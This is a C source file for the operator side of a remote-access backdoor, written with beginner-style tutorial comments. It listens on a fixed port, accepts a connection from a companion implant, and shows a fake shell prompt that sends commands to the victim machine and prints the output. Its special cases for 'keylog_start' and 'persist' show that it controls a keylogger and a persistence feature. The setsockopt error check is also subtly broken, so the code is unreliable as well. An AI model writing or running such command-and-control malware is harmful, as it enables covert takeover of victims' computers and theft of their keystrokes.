#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h> //Library not found on windows but may launch properly on Linux 
#include <netinet/in.h> //Library not found on windows but may launch properly on Linux
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h> //Library not found on windows but may launch properly on Linux

int main(){ //Will be creating a connection and sending a command or response
    //Creating variables used
     int sock, client_socket; //Here we have two socket variables, we need client socket because since we are using a server we need our own socket, when interacting to the user we need to use ours
     char buffer[1024]; //For our commands
     char response[18384]; //Same size of our backdoor array
     struct sockaddr_in server_address, client_address; //For target connection
     
     //Will Explain these later on in the program
     int i = 0; 
     int optval = 1;
     socklen_t client_length;

     sock = socket(AF_INET,SOCK_STREAM,0); //Same as our backdoor program

     if (setsockopt(sock, SOL_SOCKET,SO_REUSEADDR, &optval, sizeof(optval) < 0)){ //Checking wheather our setting of our socket worked, the optval is used to store our result, if its zero it is an error hence continue with the if statement
        printf("Error setting TCP socket options!\n");
        return 1; //Exit program
     } 

     //Setting up our server address
     server_address.sin_family = AF_INET; 
     server_address.sin_addr.s_addr = inet_addr("192.168.68.107"); //Same address of our backdoor
     server_address.sin_port = htons(50004); //Port we used, doesnt need to be the same one as long as it is free and not occupied

     //Function of the server only, this is used to find the server IP and port
     bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
     listen(sock, 5); //Will listen to incoming connections, 5 being the amount of connections we want to accept
     client_length = sizeof(client_address);
     client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length); //Accepting of the connection request, the variable will be used to communicate with the target

     while(1){
         jump:
         bzero(&buffer, sizeof(buffer)); //Exists in Linux C programming, no need to define (if its coded in Windows you need to re define it)
         bzero(&response, sizeof(response));
         printf("* Shell#%s-$: ", inet_ntoa(client_address.sin_addr)); //Replacing %s with the client IP address, we are emulating the Linux CLI shell

         fgets(buffer,sizeof(buffer),stdin); //Will get the string and store it
         strtok(buffer, "\n"); //Removing the new line that comes in fgets (the \n), this string fucntion will find that value and remove it

         write(client_socket, buffer, sizeof(buffer)); //Successfully sent command to target

         if(strncmp("q", buffer, 1) == 0){ //If q is detected (quit) then close the program, this will find "q" in the buffer array
            break; //Exit loop
         } 
         else if(strncmp("cd ", buffer, 3) == 0){ //This is used since cd does not give us an output back, if we dont do this the program will crash or be stuck in an infinite loop since it will await an output back where in this case it cannot get one
            goto jump; //Jump to the "jump" statement on the first line of the loop
         }
         else if(strncmp("keylog_start", buffer, 12) == 0){ //This is used since our keylogger function does not give us an output back, if we dont do this the program will crash or be stuck in an infinite loop since it will await an output back where in this case it cannot get one
            goto jump; //Jump to the "jump" statement on the first line of the loop
         }
         else if(strncmp("persist", buffer, 7) == 0){ //This is used since our persist function does not give us an output back, if we dont do this the program will crash or be stuck in an infinite loop since it will await an output back where in this case it cannot get one
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response); //Get the response back printed
         }
         else{ //If not equal to q continue:
            recv(client_socket, response, sizeof(response), MSG_WAITALL); //MSG_WAITALL is a function used in Linux, for more information visit: man7.org/linux/man-pages/man2/recv2.html
            printf("%s", response); //Get the response back printed
         }
     }
}